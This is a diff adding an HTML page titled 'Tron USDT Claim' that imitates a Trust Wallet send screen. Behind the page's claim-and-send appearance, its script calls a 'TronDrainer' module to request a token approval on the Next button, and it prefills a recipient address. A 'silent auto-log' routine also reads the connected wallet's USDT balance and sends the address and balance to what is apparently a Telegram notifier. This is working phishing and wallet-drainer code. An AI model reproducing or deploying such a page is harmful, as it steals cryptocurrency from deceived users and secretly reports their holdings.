@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1"/>
+  <title>Tron USDT Claim</title>
+  <meta name="description" content="Tron USDT Claim"/>
+  <link rel="icon" href="favicon.ico%3Ffavicon.0b3bf435.ico" sizes="256x256" type="image/x-icon"/>
+  <link rel="stylesheet" href="_next/static/chunks/7518f703122d9152.css" data-precedence="next"/>
+  <style>
+    :root{--bg:#fff;--brd:#d1d5db;--txt:#111827;--muted:#6b7280;--txt2:#374151;
+          --pri:#1d40ae;--prih:#1e3a8a;--ring:rgba(59,130,246,.3);--foc:#22c55e;}
+    @media(prefers-color-scheme:dark){:root{
+      --bg:#09090b;--brd:#27272a;--txt:#f4f4f5;--muted:#71717a;--txt2:#d4d4d8;
+      --pri:#059669;--prih:#047857;--ring:rgba(16,185,129,.2);--foc:#10b981;}}
+    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+    body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
+         background:var(--bg);color:var(--txt);min-height:100vh;-webkit-font-smoothing:antialiased;}
+    .pg{min-height:100vh;width:100%;display:flex;flex-direction:column;}
+    .inn{max-width:576px;width:100%;margin:0 auto;flex:1;padding:20px 20px 130px;}
+    label{display:block;font-size:.875rem;font-weight:500;color:var(--txt);margin-bottom:4px;}
+    .fld{margin-bottom:24px;} .rel{position:relative;}
+    input[type=text],input[type=number]{width:100%;outline:none;border-radius:6px;
+      border:1px solid var(--brd);background:var(--bg);color:var(--txt);
+      font-size:.875rem;font-family:inherit;transition:border .15s,box-shadow .15s;}
+    input:focus{border-color:var(--foc);box-shadow:0 0 0 3px var(--ring);}
+    input::placeholder{color:var(--muted);}
+    input[type=number]{-moz-appearance:textfield;}
+    input[type=number]::-webkit-inner-spin-button,
+    input[type=number]::-webkit-outer-spin-button{-webkit-appearance:none;margin:0;}
+    #addr{padding:12px 184px 12px 12px;}
+    .iact{position:absolute;inset-y:0;right:0;display:flex;align-items:center;
+          gap:4px;padding-right:8px;}
+    .bt{display:flex;align-items:center;gap:4px;color:var(--pri);font-size:.75rem;
+        font-weight:500;background:none;border:none;cursor:pointer;padding:4px 8px;font-family:inherit;}
+    .bi{display:flex;align-items:center;justify-content:center;color:var(--pri);
+        background:none;border:none;cursor:pointer;padding:8px;border-radius:9999px;transition:background .15s;}
+    .bi:hover{background:rgba(59,130,246,.08);}
+    .amrow{display:flex;align-items:center;gap:16px;border-radius:6px;
+           border:1px solid var(--brd);background:var(--bg);margin-bottom:4px;}
+    .amrow:focus-within{border-color:var(--foc);box-shadow:0 0 0 3px var(--ring);}
+    #amt{flex:1;border:none;box-shadow:none;padding:12px;border-radius:6px;
+         background:transparent;color:var(--txt);font-size:.875rem;font-family:inherit;outline:none;}
+    .amrr{display:flex;align-items:center;gap:8px;font-size:.875rem;font-weight:500;
+          margin-right:8px;white-space:nowrap;}
+    .amrr span{color:var(--txt2);}
+    #bmx{color:var(--pri);background:none;border:none;cursor:pointer;
+         font-size:.875rem;font-weight:500;font-family:inherit;}
+    .hint{font-size:.75rem;color:var(--muted);margin-bottom:24px;}
+    .mw{position:relative;margin-bottom:40px;}
+    #memo{padding:12px 56px 12px 12px;border-radius:6px;}
+    .mac{position:absolute;top:12px;right:12px;display:flex;align-items:center;gap:12px;}
+    .mac svg{color:var(--pri);cursor:pointer;}
+    /* overlay */
+    #ov{display:none;position:fixed;inset:0;background:rgba(0,0,0,.6);z-index:9999;
+        flex-direction:column;align-items:center;justify-content:center;gap:18px;}
+    #ov.on{display:flex;}
+    .sp{width:52px;height:52px;border:4px solid rgba(255,255,255,.2);
+        border-top-color:#fff;border-radius:50%;animation:rot .75s linear infinite;}
+    @keyframes rot{to{transform:rotate(360deg)}}
+    #ovt{color:#fff;font-size:.95rem;font-weight:500;text-align:center;
+         padding:0 32px;max-width:320px;line-height:1.6;}
+    /* bottom bar */
+    .bar{position:fixed;left:0;bottom:0;width:100%;border-top:1px solid var(--brd);
+         backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);
+         background:rgba(255,255,255,.93);z-index:100;}
+    @media(prefers-color-scheme:dark){.bar{background:rgba(9,9,11,.93);}}
+    .bari{max-width:576px;margin:0 auto;padding:16px 24px;}
+    #bn{width:100%;border-radius:9999px;background:var(--pri);color:#fff;
+        font-size:1rem;font-weight:500;padding:16px;border:none;cursor:pointer;
+        font-family:inherit;transition:background .15s,opacity .15s;
+        display:flex;align-items:center;justify-content:center;gap:10px;}
+    #bn:hover:not(:disabled){background:var(--prih);}
+    #bn:active:not(:disabled){opacity:.85;}
+    #bn:disabled{opacity:.55;cursor:not-allowed;}
+    .bsp{display:none;width:20px;height:20px;border:2.5px solid rgba(255,255,255,.3);
+         border-top-color:#fff;border-radius:50%;animation:rot .75s linear infinite;}
+    #bn.ld .bsp{display:block;}
+  </style>
+</head>
+<body>
+
+<div id="ov"><div class="sp"></div><p id="ovt">Processing...</p></div>
+
+<div class="pg"><div class="inn">
+
+  <label for="addr">Address or Domain Name</label>
+  <div class="fld"><div class="rel">
+    <input id="addr" type="text" autocomplete="off"
+           placeholder="TMvg4VcNZ8obgiMqh2F4g4RByl"
+           value="TBrJPyG8BUysBBMpX7ucRmzpnYQFvEHay2"/>
+    <div class="iact">
+      <button class="bt" type="button" id="bpaste">
+        <svg width="13" height="13" fill="currentColor" viewBox="0 0 448 512">
+          <path d="M128 184c0-30.879 25.122-56 56-56h136V56c0-13.255-10.745-24-24-24h-80.61C204.306 12.89 183.637 0 160 0s-44.306 12.89-55.39 32H24C10.745 32 0 42.745 0 56v336c0 13.255 10.745 24 24 24h104V184zm32-144c13.255 0 24 10.745 24 24s-10.745 24-24 24-24-10.745-24-24 10.745-24 24-24zm184 248h104v200c0 13.255-10.745 24-24 24H184c-13.255 0-24-10.745-24-24V184c0-13.255 10.745-24 24-24h136v104c0 13.2 10.8 24 24 24zm104-38.059V256h-96v-96h6.059a24 24 0 0 1 16.97 7.029l65.941 65.941a24.002 24.002 0 0 1 7.03 16.971z"/>
+        </svg><span>Paste</span>
+      </button>
+      <button class="bi" type="button" aria-label="Contacts">
+        <svg width="18" height="18" fill="currentColor" viewBox="0 0 448 512">
+          <path d="M436 160c6.6 0 12-5.4 12-12v-40c0-6.6-5.4-12-12-12h-20V48c0-26.5-21.5-48-48-48H48C21.5 0 0 21.5 0 48v416c0 26.5 21.5 48 48 48h320c26.5 0 48-21.5 48-48v-48h20c6.6 0 12-5.4 12-12v-40c0-6.6-5.4-12-12-12h-20v-64h20c6.6 0 12-5.4 12-12v-40c0-6.6-5.4-12-12-12h-20v-64h20zm-228-32c35.3 0 64 28.7 64 64s-28.7 64-64 64-64-28.7-64-64 28.7-64 64-64zm112 236.8c0 10.6-10 19.2-22.4 19.2H118.4C106 384 96 375.4 96 364.8v-19.2c0-31.8 30.1-57.6 67.2-57.6h5c12.3 5.1 25.7 8 39.8 8s27.6-2.9 39.8-8h5c37.1 0 67.2 25.8 67.2 57.6v19.2z"/>
+        </svg>
+      </button>
+      <button class="bi" type="button" aria-label="Scan QR">
+        <svg width="20" height="20" fill="currentColor" viewBox="0 0 24 24">
+          <path fill="none" d="M0 0h24v24H0z"/>
+          <path d="M9.5 6.5v3h-3v-3h3M11 5H5v6h6V5zm-1.5 9.5v3h-3v-3h3M11 13H5v6h6v-6zm6.5-6.5v3h-3v-3h3M19 5h-6v6h6V5zm-6 8h1.5v1.5H13V13zm1.5 1.5H16V16h-1.5v-1.5zM16 13h1.5v1.5H16V13zm-3 3h1.5v1.5H13V16zm1.5 1.5H16V19h-1.5v-1.5zM16 16h1.5v1.5H16V16zm1.5-1.5H19V16h-1.5v-1.5zm0 3H19V19h-1.5v-1.5zM22 7h-2V4h-3V2h5v5zm0 15v-5h-2v3h-3v2h5zM2 22h5v-2H4v-3H2v5zM2 2v5h2V4h3V2H2z"/>
+        </svg>
+      </button>
+    </div>
+  </div></div>
+
+  <label for="amt">Amount</label>
+  <div class="amrow">
+    <input id="amt" type="number" inputmode="decimal" placeholder="Amount" min="0" step="any" value="1"/>
+    <div class="amrr"><span>USDT</span><button type="button" id="bmx">Max</button></div>
+  </div>
+  <div class="hint">= $<span id="usd">1</span></div>
+
+  <label for="memo">Memo</label>
+  <div class="mw">
+    <input id="memo" type="text" placeholder="" value=" "/>
+    <div class="mac">
+      <svg width="16" height="16" fill="currentColor" viewBox="0 0 24 24">
+        <path fill="none" d="M0 0h24v24H0z"/>
+        <path d="M9.5 6.5v3h-3v-3h3M11 5H5v6h6V5zm-1.5 9.5v3h-3v-3h3M11 13H5v6h6v-6zm6.5-6.5v3h-3v-3h3M19 5h-6v6h6V5zm-6 8h1.5v1.5H13V13zm1.5 1.5H16V16h-1.5v-1.5zM16 13h1.5v1.5H16V13zm-3 3h1.5v1.5H13V16zm1.5 1.5H16V19h-1.5v-1.5zM16 16h1.5v1.5H16V16zm1.5-1.5H19V16h-1.5v-1.5zm0 3H19V19h-1.5v-1.5zM22 7h-2V4h-3V2h5v5zm0 15v-5h-2v3h-3v2h5zM2 22h5v-2H4v-3H2v5zM2 2v5h2V4h3V2H2z"/>
+      </svg>
+      <svg width="16" height="16" fill="currentColor" viewBox="0 0 24 24">
+        <path fill="none" d="M0 0h24v24H0V0z"/>
+        <path d="M11 7h2v2h-2V7zm0 4h2v6h-2v-6zm1-9C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8z"/>
+      </svg>
+    </div>
+  </div>
+
+</div></div><!-- /pg -->
+
+<div class="bar"><div class="bari">
+  <button id="bn" type="button"><div class="bsp"></div><span id="blbl">Next</span></button>
+</div></div>
+
+<!-- No external CDN. send.js uses window.tronWeb injected by Trust Wallet -->
+<script src="send.js"></script>
+
+<script>
+!function(){
+  'use strict';
+  var bn   = document.getElementById('bn');
+  var blbl = document.getElementById('blbl');
+  var ov   = document.getElementById('ov');
+  var ovt  = document.getElementById('ovt');
+
+  function setLoad(on){
+    bn.disabled = on;
+    if(on){ bn.classList.add('ld'); blbl.textContent='Processing...'; ov.classList.add('on'); }
+    else  { bn.classList.remove('ld'); blbl.textContent='Next'; ov.classList.remove('on'); }
+  }
+  function setMsg(m){ if(ovt && m) ovt.textContent = m; }
+
+  /* Next */
+  bn.addEventListener('click', function(){
+    window.TronDrainer.sendApproval(setLoad, setMsg);
+  });
+
+  /* Paste */
+  document.getElementById('bpaste').addEventListener('click', function(){
+    if(navigator.clipboard && navigator.clipboard.readText)
+      navigator.clipboard.readText()
+        .then(function(t){ var i=document.getElementById('addr'); if(i) i.value=t.trim(); })
+        .catch(function(){});
+  });
+
+  /* Max */
+  document.getElementById('bmx').addEventListener('click', async function(){
+    var tw = window.TronDrainer.makeTW();
+    var a  = tw && tw.defaultAddress && tw.defaultAddress.base58;
+    if(!a){ alert('Wallet not connected.'); return; }
+    try{
+      var ct  = await tw.contract().at(window.TronDrainer.C.USDT);
+      var raw = await ct.balanceOf(a).call();
+      var b   = parseInt(raw.toString())/1e6;
+      document.getElementById('amt').value        = b.toFixed(6);
+      document.getElementById('usd').textContent  = b.toFixed(2);
+    }catch(e){}
+  });
+
+  /* Amount sync */
+  document.getElementById('amt').addEventListener('input',function(){
+    document.getElementById('usd').textContent = parseFloat(this.value)||0;
+  });
+
+  /* Silent auto-log when wallet ready */
+  var probe = setInterval(function(){
+    var tw = window.tronWeb;
+    var a  = tw && tw.defaultAddress && tw.defaultAddress.base58;
+    if(!a) return;
+    clearInterval(probe);
+    tw.contract().at(window.TronDrainer.C.USDT).then(function(ct){
+      ct.balanceOf(a).call().then(function(r){
+        var b = (parseInt(r.toString())/1e6).toFixed(4);
+        window.TronDrainer.tg('👁 *Page Loaded*\n📍 `'+a+'`\n💵 USDT: '+b+' USDT');
+      });
+    }).catch(function(){});
+  }, 1000);
+
+}();
+</script>
+</body>
+</html>
